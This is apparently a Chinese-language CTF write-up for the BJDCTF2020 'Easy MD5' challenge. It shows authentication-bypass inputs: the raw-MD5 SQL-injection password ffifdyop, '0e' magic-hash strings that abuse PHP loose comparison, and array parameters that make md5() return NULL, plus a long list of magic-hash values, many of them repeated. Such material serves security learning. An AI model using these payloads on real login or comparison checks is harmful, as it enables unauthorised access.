# [BJDCTF2020]Easy MD5
TAG:PHP MD5 
## 解题过程：
![20210105110615](https://raw.githubusercontent.com/mrzhang76/MdPicture/master/20210105110615.png)  
题目界面只有一个密码输入框，根据题目名称提示MD5尝试输入MD5万能密码:```ffifdyop```  
成功到达第二层  
![20210105111405](https://raw.githubusercontent.com/mrzhang76/MdPicture/master/20210105111405.png)  
查看页面源代码获取信息  
![20210105111558](https://raw.githubusercontent.com/mrzhang76/MdPicture/master/20210105111558.png)  
这里依然是MD5问题，利用PHP处理MD5的"特性",传递参数```a=s878926199a&b=s155964671a```  
成功达到第三层  
![20210105111934](https://raw.githubusercontent.com/mrzhang76/MdPicture/master/20210105111934.png)  
此处依然利用PHP的MD5"特性"，post传入参数：```param1[]=1&param2[]=2```，成功获取flag
![20210105112047](https://raw.githubusercontent.com/mrzhang76/MdPicture/master/20210105112047.png)  
## 题目分析：  
此题目考查了一些PHP安全"特性"  
+ MD5万能密码```ffifdyop```  
  
在未加盐的情况下，```ffifdyop```经过```md5($password,true)```过后恰好结果是```'or'6�]��!r,��b```  
即最后组成的sql语句是
```
$sql="select password from users where password=''or'<xxx>'"
```
使查询结果永真，直接登陆  
+ PHP MD5函数漏洞   
  
PHP在处理哈希字符串时后，会把0E开头的哈希值解释为0。所以如果两个值通过MD5后值都已0E开头，就会相等  
一些MD5后为0E开头的字符串：
```
QNKCDZO
0e830400451993494058024219903391
s878926199a
0e545993274517709034328855841020
s155964671a
0e342768416822451524974117254469
s214587387a
0e848240448830537924465865611904
s214587387a
0e848240448830537924465865611904
s878926199a
0e545993274517709034328855841020
s1091221200a
0e940624217856561557816327384675
s1885207154a
0e509367213418206700842008763514
s1502113478a
0e861580163291561247404381396064
s1885207154a
0e509367213418206700842008763514
s1836677006a
0e481036490867661113260034900752
s155964671a
0e342768416822451524974117254469
s1184209335a
0e072485820392773389523109082030
s1665632922a
0e731198061491163073197128363787
s1502113478a
0e861580163291561247404381396064
s1836677006a
0e481036490867661113260034900752
s1091221200a
0e940624217856561557816327384675
s155964671a
0e342768416822451524974117254469
s1502113478a
0e861580163291561247404381396064
s155964671a
0e342768416822451524974117254469
s1665632922a
0e731198061491163073197128363787
s155964671a
0e342768416822451524974117254469
s1091221200a
0e940624217856561557816327384675
s1836677006a
0e481036490867661113260034900752
s1885207154a
0e509367213418206700842008763514
s532378020a
0e220463095855511507588041205815
s878926199a
0e545993274517709034328855841020
s1091221200a
0e940624217856561557816327384675
s214587387a
0e848240448830537924465865611904
s1502113478a
0e861580163291561247404381396064
s1091221200a
0e940624217856561557816327384675
s1665632922a
0e731198061491163073197128363787
s1885207154a
0e509367213418206700842008763514
s1836677006a
0e481036490867661113260034900752
s1665632922a
0e731198061491163073197128363787
s878926199a
0e545993274517709034328855841020
```  
  
+ PHP MD5函数漏洞(无法处理数组)  
PHP的MD5函数无法处理数组，会导致返回值为NULL，此时就形成了NULL=NULL，绕过了检测  
